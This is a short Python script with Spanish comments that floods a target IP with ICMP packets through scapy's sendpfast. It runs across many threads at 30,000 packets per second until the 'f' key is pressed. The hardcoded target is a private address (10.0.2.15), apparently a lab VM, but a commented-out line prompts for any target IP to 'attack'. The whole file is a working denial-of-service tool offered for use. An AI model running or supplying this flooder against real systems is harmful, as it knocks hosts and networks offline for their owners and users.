#!/usr/bin/python3
import threading 
from scapy.all import *
from scapy.layers.inet import IP, ICMP, Ether
from pynput import keyboard
import subprocess

# destino = input("ip a la que quieres atacar: ")
num_hilos= int(input("cuantos hilos quieres usar: "))

destino = "10.0.2.15"
# num_hilos = 200
total = 0
bucle = True
paquete = Ether()/IP(dst=destino)/ICMP()
def traza_icmp(ip):
    #paquete = Ether()/IP(dst=ip)/ICMP()
    while bucle:
        # ans, unans = sr(IP(dst=ip)/ICMP(), timeout=1, verbose=False, inter=0)
        # sendpfast(paquete, verbose=0)
        sendpfast(paquete, pps=30000, loop=2000)
   


def ping(ip):
    global total
    while bucle:
        try:
            salida = subprocess.check_output(['ping', '-n', '4', ip])
            total = total+1
            print(total)
            # print("Ping exitoso:")
            # print(salida.decode('utf-8'))
        except subprocess.CalledProcessError:
            print("Ping fallido: No se pudo alcanzar el host.")



#-----------Crear hilos--------------------
hilos = []
def crear_hilos(num):
    print("[*] atacando... pulsa f para finalizar")
    for i in range(1, num):
        hilo = threading.Thread(target=traza_icmp, args=(destino,))
        hilo.start()
        hilos.append(hilo)


def on_press(key):
    global bucle
    try:
        if key.char == 'f':
            print("[*] Tecla 'f' presionada. Saliendo del bucle...")
            bucle = False
            return False  # Detener el listener
    except AttributeError:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()



crear_hilos(num_hilos)
for hilo in hilos:
    hilo.join()


